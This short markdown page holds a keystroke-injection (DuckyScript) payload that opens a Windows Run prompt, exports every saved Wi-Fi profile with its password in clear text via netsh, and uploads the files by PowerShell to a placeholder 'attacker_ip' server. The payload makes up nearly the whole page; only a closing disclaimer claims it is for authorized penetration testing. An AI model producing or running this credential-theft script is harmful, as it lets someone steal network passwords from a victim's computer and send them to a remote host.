# Extracting and Sending Stored Wi-Fi Credentials

Extracts Wi-Fi credentials and sends them to a remote server.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "netsh wlan export profile key=clear folder='C:\\Users\\User\\Documents\\wifi_credentials'"
ENTER
DELAY 500
STRING powershell -Command "Invoke-WebRequest -Uri 'http://attacker_ip/upload' -Method POST -InFile 'C:\\Users\\User\\Documents\\wifi_credentials\\*.xml'"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.